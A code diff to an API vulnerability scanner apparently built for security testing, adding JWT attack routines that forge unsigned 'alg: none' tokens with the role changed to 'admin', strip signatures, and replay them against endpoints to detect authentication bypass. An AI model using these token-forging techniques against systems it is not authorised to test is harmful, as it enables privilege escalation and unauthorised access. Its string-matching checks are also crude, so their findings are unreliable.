@@ -2,6 +2,10 @@ import asyncio
 import os
 import json
 import argparse
+import base64
+from copy import deepcopy
+import jwt
+
 from colorama import Fore, Style
 from report_generator import generate_html_report
 from parser.parser_factory import ParserFactory
@@ -26,6 +30,40 @@ from core.execution_engine import ExecutionEngine
 from core.intelligence_core import IntelligenceCore
 from core.scan_pahse_engine import ScanPhaseEngine
 from core.auth_Strategy_engine import AuthStrategyEngine
+
+
+# ================= JWT TESTING CORE =================
+
+def decode_jwt(token):
+    try:
+        return jwt.decode(token, options={"verify_signature": False})
+    except:
+        return None
+
+
+def encode_none(payload):
+    header = {"alg": "none", "typ": "JWT"}
+
+    def b64(data):
+        return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b"=").decode()
+
+    return f"{b64(header)}.{b64(payload)}."
+
+
+def tamper_role(payload):
+    p = deepcopy(payload)
+    p["role"] = "admin"
+    return p
+
+
+def remove_signature(token):
+    parts = token.split(".")
+    if len(parts) == 3:
+        return parts[0] + "." + parts[1] + "."
+    return token
+
+
+# ===================================================
 
 
 def create_executor(mode, base_url=None, replay_file=None) -> BaseExecutor:
@@ -68,7 +106,6 @@ async def run_scan_async(
     executor = create_executor(mode, target, replay_file)
 
     attacker = AttackGenerator()
-    auth_attacker = AuthAttackGenerator()
     analyzer = ResponseAnalyzer()
     semantic_engine = SemanticDiffEngine()
     risk_scorer = EndpointRiskScorer()
@@ -85,14 +122,12 @@ async def run_scan_async(
     )
 
     phase_engine = ScanPhaseEngine(memory)
-    auth_engine = AuthStrategyEngine(auth_attacker)
 
     endpoints = parser.get_all_endpoints()
     ranked_endpoints = risk_scorer.rank_endpoints(endpoints)
 
-    auth_payloads = auth_engine.get_auth_payloads()
-
     findings = []
+    jwt_token = None
 
     for endpoint in ranked_endpoints:
 
@@ -103,10 +138,7 @@ async def run_scan_async(
 
         baseline = await execution_engine.get_baseline(endpoint)
 
-        depth_limit = phase_engine.determine_depth(endpoint)
-
         details = parser.get_endpoint_details(path, method)
-
         base_payloads = attacker.generate_for_endpoint(details)
 
         selected_payloads = payload_strategy.generate(
@@ -115,101 +147,86 @@ async def run_scan_async(
             base_payloads,
         )
 
-        structured_payloads = []
-
-        for p in selected_payloads:
-
-            if isinstance(p, dict):
-                payload = p.copy()
-            else:
-                payload = {"payload": str(p)}
-
-            payload["__family__"] = payload.get("family", "generic")
-
-            structured_payloads.append(payload)
-
-        final_payloads = structured_payloads[:depth_limit] + auth_payloads[:10]
-
-        for payload in final_payloads:
+        for payload in selected_payloads[:5]:
 
             try:
-                # ✅ Inject token BEFORE request (stateful auth)
-                payload = auth_engine.inject_token(payload)
-
                 result = await execution_engine.execute(endpoint, payload)
 
                 if not result:
                     continue
 
-                # ✅ Extract token AFTER login response
-                if "/login" in path:
-                    auth_engine.extract_token(result)
+                # Extract JWT from login
+                if "/login" in path and isinstance(result, dict):
+                    jwt_token = result.get("token")
 
-                # DEBUG
-                print("\n--- DEBUG ---")
-                print("ENDPOINT:", path)
-                print("PAYLOAD:", payload)
-                print("RESPONSE:", str(result)[:300])
-                print("-------------\n")
+                # ================= JWT TESTING =================
 
-                # fallback detection
+                if jwt_token:
+
+                    decoded = decode_jwt(jwt_token)
+
+                    if decoded:
+
+                        # 1. Role Tampering
+                        tampered = tamper_role(decoded)
+                        forged = encode_none(tampered)
+
+                        res = await execution_engine.execute(endpoint, {
+                            "__headers__": {"Authorization": forged}
+                        })
+
+                        if res and str(res) != str(baseline):
+                            findings.append({
+                                "endpoint": path,
+                                "method": method,
+                                "reason": "JWT Role Tampering",
+                                "severity": "CRITICAL"
+                            })
+
+                        # 2. No Signature
+                        no_sig = remove_signature(jwt_token)
+
+                        res = await execution_engine.execute(endpoint, {
+                            "__headers__": {"Authorization": no_sig}
+                        })
+
+                        if res and "200" in str(res):
+                            findings.append({
+                                "endpoint": path,
+                                "method": method,
+                                "reason": "JWT No Signature Accepted",
+                                "severity": "CRITICAL"
+                            })
+
+                        # 3. No Token
+                        res = await execution_engine.execute(endpoint, {})
+
+                        if res and "200" in str(res):
+                            findings.append({
+                                "endpoint": path,
+                                "method": method,
+                                "reason": "No Authentication Required",
+                                "severity": "HIGH"
+                            })
+
+                # =================================================
+
                 response_text = str(result).lower()
 
-                vuln = False
-                reason = ""
-
-                if "root" in response_text or "uid=" in response_text:
-                    vuln = True
-                    reason = "Command Injection"
-
-                elif "<script>" in response_text:
-                    vuln = True
-                    reason = "XSS"
-
-                elif "sql" in response_text or "syntax" in response_text:
-                    vuln = True
-                    reason = "SQL Injection"
-
-                if vuln:
+                if "root" in response_text:
                     findings.append({
                         "endpoint": path,
                         "method": method,
-                        "payload": payload,
-                        "reason": reason,
-                        "response": response_text[:200]
+                        "reason": "Command Injection",
+                        "severity": "CRITICAL"
                     })
 
-                # ✅ AUTH FINDINGS (this was missing properly)
-                auth_findings = auth_engine.process(endpoint, payload, result, memory)
-
-                for af in auth_findings:
-                    findings.append({
-                        "endpoint": path,
-                        "method": method,
-                        "payload": payload,
-                        "reason": af["type"],
-                        "severity": af["severity"],
-                        "response": str(result)[:200]
-                    })
-
-                intelligence.process(
-                    endpoint,
-                    payload,
-                    baseline,
-                    result
-                )
-
-                if result.get("vulnerability_detected"):
-                    severity_engine.process(result)
+                intelligence.process(endpoint, payload, baseline, result)
 
             except Exception as e:
-                print(
-                    f"{Fore.RED}Execution error on {path}: {str(e)}{Style.RESET_ALL}"
-                )
+                print(f"{Fore.RED}Execution error on {path}: {str(e)}{Style.RESET_ALL}")
 
-    print(
-        f"\n{Fore.GREEN}✓ Completed scanning {len(ranked_endpoints)} endpoints{Style.RESET_ALL}\n"
-    )
+    print(f"\n{Fore.GREEN}✓ Completed scanning {len(ranked_endpoints)} endpoints{Style.RESET_ALL}\n")
 
     analyzer.print_summary()
 
@@ -243,30 +260,10 @@ if __name__ == "__main__":
 
     parser = argparse.ArgumentParser(description="AAVS API Vulnerability Scanner")
 
-    parser.add_argument(
-        "--spec",
-        required=True,
-        help="Path to OpenAPI/Swagger specification file",
-    )
-
-    parser.add_argument(
-        "--base_url",
-        default="http://localhost:3000",
-        help="Target API base URL",
-    )
-
-    parser.add_argument(
-        "--mode",
-        default="live",
-        choices=["live", "mock", "replay"],
-        help="Execution mode",
-    )
-
-    parser.add_argument(
-        "--replay_file",
-        default=None,
-        help="Replay file for replay mode",
-    )
+    parser.add_argument("--spec", required=True)
+    parser.add_argument("--base_url", default="http://localhost:3000")
+    parser.add_argument("--mode", default="live", choices=["live", "mock", "replay"])
+    parser.add_argument("--replay_file", default=None)
 
     args = parser.parse_args()
 
@@ -284,4 +281,5 @@ if __name__ == "__main__":
 
     for f in findings:
         print(json.dumps(f, indent=2))
-generate_html_report(findings)        
+
+    generate_html_report(findings)
